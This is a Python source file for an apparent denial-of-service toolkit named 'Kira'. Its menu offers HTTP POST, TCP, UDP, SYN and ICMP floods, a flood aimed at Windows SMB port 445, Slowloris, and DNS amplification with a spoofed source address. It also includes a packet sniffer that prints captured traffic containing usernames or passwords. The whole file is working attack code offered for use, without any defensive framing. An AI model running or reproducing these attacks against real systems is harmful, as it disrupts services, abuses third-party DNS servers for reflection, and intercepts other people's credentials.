import socket
import time
import random
import requests
from concurrent.futures import ThreadPoolExecutor
from scapy.all import *



def tcp_flood_windows():
    print("Initiating TCP Flood attack targeting Windows machines...")
    target_ip = input("Target IP: ")
    target_port = 445  # SMB port commonly used by Windows machines
    threads = int(input("Number of concurrent threads: "))
    packet_size = 1024  # Adjust packet size as needed

    def send_tcp_packet():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.send(b"X" * packet_size)
            sock.close()
        except socket.error as e:
            print("An error occurred:", e)

    num_requests = int(input("Enter the number of requests: "))

    def stress_test():
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(send_tcp_packet) for _ in range(num_requests)]
            for future in futures:
                future.result()

    stress_test()

def start_sniffing():
    print("Sniffing packets...")
    my_ip = get_local_ip()
    delay = int(input("Enter the delay between packet captures (in seconds): "))

    def sniff_with_credentials(packet):
        if IP in packet and packet[IP].src != my_ip:
            if packet.haslayer(UDP) or packet.haslayer(TCP):
                print("IP Address:", packet[IP].src)
                # Capture username and password if found
                if packet.haslayer(Raw):
                    data = packet[Raw].load.decode('utf-8', errors='ignore')
                    if 'username' in data.lower() or 'password' in data.lower():
                        print("Captured credentials:", data)
                time.sleep(delay)  # Add delay between packet captures

    sniff(filter="udp or tcp", prn=sniff_with_credentials, store=0)

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    return local_ip

def http_post_dos(use_proxy=False, proxies_list=None):
    print("Initiating HTTP POST DoS attack...")
    url = input("Target URL (must start with http:// or https://): ")

    data = {
        'key1': 'value1',
        'key2': 'value2',
    }

    def send_request(proxy=None):
        try:
            if proxy:
                proxies = {
                    'http': proxy,
                    'https': proxy,
                }
            else:
                proxies = None
            response = requests.post(url, data=data, proxies=proxies)
            print("Response status code:", response.status_code)
            print("Response text:", response.text)
        except requests.exceptions.RequestException as e:
            print("An error occurred:", e)

    num_requests = int(input("Enter the number of requests: "))
    num_threads = int(input("Enter the number of concurrent threads: "))
    times = int(input("How many times do you want this to be executed? "))

    def stress_test():
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            for _ in range(times):
                futures = []
                for _ in range(num_requests):
                    if proxies_list:
                        proxy = random.choice(proxies_list)
                        futures.append(executor.submit(send_request, proxy))
                    else:
                        futures.append(executor.submit(send_request))
                for future in futures:
                    future.result()

    stress_test()

def tcp_flood():
    print("Initiating TCP Flood attack...")
    target_ip = input("Target IP: ")
    target_port = int(input("Target Port: "))
    threads = int(input("Number of concurrent threads: "))
    packet_size = int(input("Packet size in bytes: "))

    def send_tcp_packet():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.send(b"X" * packet_size)
            sock.close()
        except socket.error as e:
            print("An error occurred:", e)

    num_requests = int(input("Enter the number of requests: "))

    def stress_test():
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(send_tcp_packet) for _ in range(num_requests)]
            for future in futures:
                future.result()

    stress_test()

def udp_flood():
    print("Initiating UDP Flood attack...")
    target_ip = input("Target IP: ")
    target_port = int(input("Target Port: "))
    threads = int(input("Number of concurrent threads: "))
    packet_size = int(input("Packet size in bytes: "))

    def send_udp_packet():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(b"X" * packet_size, (target_ip, target_port))
        except socket.error as e:
            print("An error occurred:", e)

    num_requests = int(input("Enter the number of requests: "))

    def stress_test():
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(send_udp_packet) for _ in range(num_requests)]
            for future in futures:
                future.result()

    stress_test()

def syn_flood():
    print("Initiating SYN Flood attack...")
    target_ip = input("Target IP: ")
    target_port = int(input("Target Port: "))
    threads = int(input("Number of concurrent threads: "))

    def send_syn_packet():
        try:
            packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
            send(packet, verbose=False)
        except Exception as e:
            print("An error occurred:", e)

    num_requests = int(input("Enter the number of requests: "))

    def stress_test():
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(send_syn_packet) for _ in range(num_requests)]
            for future in futures:
                future.result()

    stress_test()

def icmp_flood():
    print("Initiating ICMP Flood attack...")
    target_ip = input("Target IP: ")
    threads = int(input("Number of concurrent threads: "))
    packet_size = int(input("Packet size in bytes: "))

    def send_icmp_packet():
        try:
            packet = IP(dst=target_ip)/ICMP()/(b'X' * packet_size)
            send(packet, verbose=False)
        except Exception as e:
            print("An error occurred:", e)

    num_requests = int(input("Enter the number of requests: "))

    def stress_test():
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(send_icmp_packet) for _ in range(num_requests)]
            for future in futures:
                future.result()

    stress_test()
    
    
def slowloris():
    print("Initiating Slowloris attack...")
    target_ip = input("Target IP: ")
    target_port = int(input("Target Port: "))
    threads = int(input("Number of concurrent threads: "))

    def send_partial_request():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.send("GET / HTTP/1.1\r\n".encode("utf-8"))
            while True:
                time.sleep(15)
                sock.send("X-a: {}\r\n".format(random.randint(1, 1000)).encode("utf-8"))
        except socket.error as e:
            print("An error occurred:", e)

    num_requests = int(input("Enter the number of requests: "))

    def stress_test():
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(send_partial_request) for _ in range(num_requests)]
            for future in futures:
                future.result()

    stress_test()

def dns_amplification():
    print("Initiating DNS Amplification attack...")
    target_ip = input("Target IP: ")
    dns_server = input("DNS Server IP: ")
    threads = int(input("Number of concurrent threads: "))

    def send_dns_request():
        try:
            packet = IP(src=target_ip, dst=dns_server)/UDP()/DNS(rd=1, qd=DNSQR(qname="example.com"))
            send(packet, verbose=False)
        except Exception as e:
            print("An error occurred:", e)

    num_requests = int(input("Enter the number of requests: "))

    def stress_test():
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(send_dns_request) for _ in range(num_requests)]
            for future in futures:
                future.result()

    stress_test()

banner = """
/----------------------\\
    

 ____  __.__               
|    |/ _|__|___________   
|      < |  \\_  __ \\__  \\  
|    |  \\|  ||  | \\// __ \\_
|____|__ \\__||__|  (____  /
        \\/              \\/ 
        
        
        
 Coded By Viraps       


/----------------------\\
"""

print(banner)

choice = input("""
1. HTTP POST DoS
2. TCP Flood
3. UDP Flood
4. SYN Flood
5. TCP Flood targeting Windows machines
6. Start IP Sniffing
7. ICMP Flood
8. Slowloris Attack
9. DNS Amplification
10. botnet
11. Help
""")

if choice == "1":
    http_post_dos()
elif choice == "2":
    tcp_flood()
elif choice == "3":
    udp_flood()
elif choice == "4":
    syn_flood()
elif choice == "5":
    tcp_flood_windows()
elif choice == "6":
    start_sniffing()
elif choice == "7":
    icmp_flood()
elif choice == "8":
    slowloris()
elif choice == "9":
    dns_amplification()
elif choice == "10":
    print("test")    
elif choice == "11":
    print("""
Attack Descriptions:

1. HTTP POST DoS: Sends multiple HTTP POST requests to the target URL to overwhelm the server.
2. TCP Flood: Sends a large number of TCP packets to the target IP and port to consume bandwidth and resources.
3. UDP Flood: Sends a large number of UDP packets to the target IP and port to consume bandwidth and resources.
4. SYN Flood: Sends a large number of SYN packets to the target IP and port, attempting to exhaust server resources.
5. TCP Flood targeting Windows machines: Specifically targets port 445 (SMB) on Windows machines with TCP packets.
6. Start IP Sniffing: Captures and displays network packets to monitor traffic and capture potential credentials.
7. ICMP Flood: Sends a large number of ICMP (ping) packets to the target IP to overwhelm the network.
8. Slowloris Attack: Opens many partial connections to the target server to exhaust its resources and prevent new connections.
9. DNS Amplification: Exploits DNS servers to send a flood of responses to the target IP, overwhelming its network.

Usage:
Choose an attack by entering the corresponding number from the main menu.          
""")
    time.sleep(60)
else:
    print("Invalid choice")
